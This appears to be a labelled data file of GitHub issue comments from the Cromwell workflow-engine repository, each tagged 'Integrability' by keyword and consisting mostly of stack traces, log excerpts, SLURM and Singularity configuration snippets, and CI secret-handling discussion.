Integrability,"oin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:7221,message,message,7221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['message'],['message']
Integrability,"okay sorry I was confused then - @geoffjentry suggested that the backend.conf was part of the cromwell base:. > The idea is that this would be in the Cromwell configuration and not per-workflow (but see below). In general that makes sense because a lot of the HPC-style use cases we see people never want to use actual Docker. As opposed to a workflow or pipeline that uses it. For example, here is the pipeline that I was working on that has a `backend.conf` that runs Singularity:. https://github.com/vsoch/wgbs-pipeline/pull/1/files#diff-f6baca157827c4888c394eab694e000c. But this is not a part of cromwell, or relevant to this repo - it's just a configuration file provided with the workflow. I was under the impression that we wanted to write something that would be integrated into cromwell to interact with Singularity, and not a configuration file provided with a particular pipeline (such as the wgbs in the example above). Do you mean that there is a template folder (or some other docs) where the ""suggested singularity backend"" would be provided? Something different? What am I missing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958:772,integrat,integrated,772,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413205958,1,['integrat'],['integrated']
Integrability,"okay, that works for me! To answer your questions about CircleCI:. - environment variables used in the project are [encrypted](https://circleci.com/docs/2.0/security/#encryption) also using hashicorp vault! So, same thing or if not very similar deal as what you have.; - once you set them in the interface, you can't change or see them; - if the environment variables aren't set in the container with ENV or as flags with --env then they won't be saved. You would likely want to have them be [ARGS](https://vsupalov.com/docker-arg-env-variable-guide/) instead to be used and available in the container during build, but then not persisted in the container. So, as long as:; - you set secrets in the project and not the circle.yml; - you don't allow the CI to pass on secrets to other forked build requests (you would have to turn it on in settings are there are a lot of **warning don't do this!** prompts before you get there and; - you use ARGS to expose needed variables from the environment to the container for building (that don't get saved). . I think you'd be ok :) But sure, I'm definitely not a security expert. Anyway, since it's a single file, please feel free to grab the commit from here if/when you are ready.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110:296,interface,interface,296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110,1,['interface'],['interface']
Integrability,"on; [2016-01-25 18:25:31,77] [info] RUN sub-command; [2016-01-25 18:25:31,91] [info] WDL file: error_continue.wdl; [2016-01-25 18:25:31,92] [info] Inputs: error_continue.json; [2016-01-25 18:25:31,562] [info] Slf4jLogger started; [2016-01-25 18:25:31,649] [info] SingleWorkflowRunnerActor: launching workflow; [2016-01-25 18:25:32,777] [info] Running with database db.url = jdbc:hsqldb:mem:65a527dd-bc31-462e-bca9-05a545fea48a;shutdown=false;hsqldb.tx=mvcc; [2016-01-25 18:25:33,796] [info] WorkflowManagerActor submitWorkflow input id = None, effective id = 9cdf23a5-1eaa-420a-8fae-ea3e4623d4db; [2016-01-25 18:25:33,812] [info] WorkflowManagerActor Found no workflows to restart.; [2016-01-25 18:25:34,730] [info] WorkflowActor [9cdf23a5]: Start message received; [2016-01-25 18:25:34,997] [info] SingleWorkflowRunnerActor: workflow ID 9cdf23a5-1eaa-420a-8fae-ea3e4623d4db; [2016-01-25 18:25:34,999] [info] WorkflowActor [9cdf23a5]: ExecutionStoreCreated(Start) message received; [2016-01-25 18:25:35,11] [warn] SingleWorkflowRunnerActor: received unexpected message: CurrentState(Actor[akka://cromwell-system/user/WorkflowManagerActor/WorkflowActor-9cdf23a5-1eaa-420a-8fae-ea3e4623d4db#-1942530845],Submitted); [2016-01-25 18:25:35,12] [info] WorkflowActor [9cdf23a5]: Beginning transition from Submitted to Running.; [2016-01-25 18:25:35,16] [info] WorkflowActor [9cdf23a5]: transitioning from Submitted to Running.; [2016-01-25 18:25:35,17] [info] SingleWorkflowRunnerActor: transitioning to Running; [2016-01-25 18:25:35,19] [info] WorkflowActor [9cdf23a5]: starting calls: w.hello; [2016-01-25 18:25:35,21] [info] WorkflowActor [9cdf23a5]: persisting status of hello to Starting.; [2016-01-25 18:25:35,174] [info] WorkflowActor [9cdf23a5]: inputs for call 'hello':; addressee -> WdlString(String); [2016-01-25 18:25:35,177] [info] WorkflowActor [9cdf23a5]: created call actor for hello.; [2016-01-25 18:25:35,186] [info] WorkflowActor [9cdf23a5]: persisting status of hello to Running.; [2016-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-174729363:1514,message,message,1514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-174729363,3,['message'],['message']
Integrability,"orials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4476,wrap,wrap,4476,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['wrap'],['wrap']
Integrability,"other benefit is that we'd reduce our dependency on dockerhub. Green team is seeing issues that look like they're throttling us, namely a bunch of these:. ```; Execution failed: pulling image: docker pull: generic::unknown: retry budget exhausted (10 attempts): ; running [""docker"" ""pull"" ""google/cloud-sdk:slim""]: exit status 1 (standard error: ""Error response from ; daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection ; (Client.Timeout exceeded while awaiting headers)\n"") at ; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541:38,depend,dependency,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541,1,['depend'],['dependency']
Integrability,"pandas/core/groupby/groupby.py:68: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, reduction,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/reshape/reshape.py:30: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos as _algos, reshape as _reshape; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/io/parsers.py:45: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.parsers as parsers; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/io/pytables.py:50: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib, writers as libwriters; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/gffutils/interface.py:161: UserWarning: It appears that this database has not had the ANALYZE sqlite3 command run on it. Doing so can dramatically speed up queries, and is done by default for databases created with gffutils >0.8.7.1 (this database was created with version 0.8.2) Consider calling the analyze() method of this object.; ""method of this object."" % self.version); Traceback (most recent call last):; File ""/usr/local/bin/bcbio_nextgen.py"", line 223, in <module>; runfn.process(kwargs[""args""]); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/distributed/runfn.py"", line 58, in process; out = fn(fnargs); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/utils.py"", line 52, in wrapper; return apply(f, *args, **kwargs); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/distributed/multitasks.py"", line 208, in pipeline_summary; return qcsummary.pipeline_summary(*args); File ""/usr/local/share/bcb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:4278,interface,interface,4278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['interface'],['interface']
Integrability,"r about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$3.apply(GcsFileSystemProvider.scala:242) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$3.apply(GcsFileSystemProvider.scala:242) ~[cromwell.jar",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:1363,protocol,protocol,1363,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['protocol'],['protocol']
Integrability,"r-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the connection used in the streaming version can then delay subsequent requests when lots of metadata requests are being made.; We also see that the graph spans longer on the X axis for the streaming version, which means the test took longer to complete. [The test](https://github.com/broadinstitute/cromwell/blob/tj-metadata-stream-experiment-2/scripts/perf/test_cases/metadata_load/metadata_load.wdl) consists of sending a lot of metadata requests to Cromwell. ### Thoughts, possible next steps and/or things to try. - I think the fs2 stream model is still interesting as it allows for a clean interruption of building of the metadata (with or without streaming from the database).; - It might be possible to choose between streaming and non streaming depending on the size of the metadata to build (would require a COUNT(*) beforehand); - It might be possible to order the database request (for instance if the query was sorted by call fqn, metadata key and timestamp) in such a way that the json can be built:; 1) Directly, i.e without need for the wrapping MetadataComponent object to maintain information about indices in the list and CRDT (which would reuse memory usage and possible build time); 2) Piece by piece and be streamed back to the requester; - Building the metadata and storing it is always a possibility. Things to consider are; - When are we sure it's complete ?; - We'd still want the ability to use includeKey and excludeKey query parameters",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:4381,depend,depending,4381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,2,"['depend', 'wrap']","['depending', 'wrapping']"
Integrability,"r.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJso",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6876,message,message,6876,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['message'],['message']
Integrability,r.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:143) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8825,protocol,protocol,8825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['protocol'],['protocol']
Integrability,"re slimming down conf, one doesn't need a large conf file. While many folks seem to go the route of copying in the entire reference.conf and making mods, I only ever include the exact bits that I'm tweaking and my conf files are pretty tight. That doesn't address the other issue. If only we had a tech writer joining our ranks soon .... ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1590#issuecomment-255498081:91,rout,route,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1590#issuecomment-255498081,1,['rout'],['route']
Integrability,"read.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:message'; AND NOT EXISTS (SELECT *; 	FROM METADATA_ENTRY AS t2; 	WHERE t2.WORKFLOW_EXECUTION_UUID = t1.WORKFLOW_EXECUTION_UUID; 	 AND (t2.CALL_FQN = t1.CALL_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column ':causedBy[]' in 'field list'; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingC",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:5328,message,message,5328,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['message'],['message']
Integrability,"rence_bundle\"":\""bf51d668-3e14-4843-9bc7-5d676fdf0e01\"",\""AdapterSs2RsemSingleSample.rrna_interval\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/hg19.rRNA.interval_list\"",\""AdapterSs2RsemSingleSample.rsem_genome\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/rsem_hg19_gencode_v19.tar.gz\"",\""AdapterSs2RsemSingleSample.runtime_environment\"":\""dev\"",\""AdapterSs2RsemSingleSample.ref_flat\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/refFlat.txt\"",\""AdapterSs2RsemSingleSample.format_map\"":\""gs://broad-dsde-mint-dev-teststorage/format_map_example.json\"",\""AdapterSs2RsemSingleSample.bundle_uuid\"":\""c59a5720-ca82-429d-9d5b-6116987e221d\"",\""AdapterSs2RsemSingleSample.ref_fasta\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/Hg19.fa\"",\""AdapterSs2RsemSingleSample.run_type\"":\""run\"",\""AdapterSs2RsemSingleSample.bundle_version\"":\""2017-09-20T211432.976293Z\"",\""AdapterSs2RsemSingleSample.gtf\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/Gencode_v19/Gencode_v19.GTF\"",\""AdapterSs2RsemSingleSample.retry_seconds\"":1E+1,\""AdapterSs2RsemSingleSample.method\"":\""Ss2RsemSingleSample\"",\""AdapterSs2RsemSingleSample.dss_url\"":\""https://dss.staging.data.humancellatlas.org/v1\"",\""AdapterSs2RsemSingleSample.submit_url\"":\""http://api.ingest.staging.data.humancellatlas.org/\"",\""AdapterSs2RsemSingleSample.star_genome\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/star_hg19_gencode_v19.tar.gz\"",\""AdapterSs2RsemSingleSample.schema_version\"":\""v3\""}"",; ""labels"": ""{}""; },; ""calls"": {},; ""outputs"": {},; ""id"": ""f1ccad5e-73d4-4905-b62f-81ab96dded19"",; ""inputs"": {},; ""submission"": ""2017-12-14T17:16:01.748Z"",; ""status"": ""Failed"",; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Some([Declaration type=Object name=prep.inputs expr=Some(prep.inputs)]) (of class scala.Some)""; }; ],; ""message"": ""Workflow input processing failed""; }; ],; ""end"": ""2017-12-14T17:16:20.791Z"",; ""start"": ""2017-12-14T17:16:20.747Z""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3060#issuecomment-351777550:5739,message,message,5739,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3060#issuecomment-351777550,2,['message'],['message']
Integrability,"rics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 cromwell-system-akka.actor.default-dispatcher-16 INFO - JES Run [UUID(129f0510):CollectQualityYieldMetrics:2]: Status change from Running to Failed; 3589854:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - CallActor [UUID(129f0510):CollectQualityYieldMetrics:2]: Failing call: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(JesBackend.scala:774) ~[cromwell.jar:0.19]; 3589857- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:685) ~[cromwell.jar:0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:2541,Message,Message,2541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['Message'],['Message']
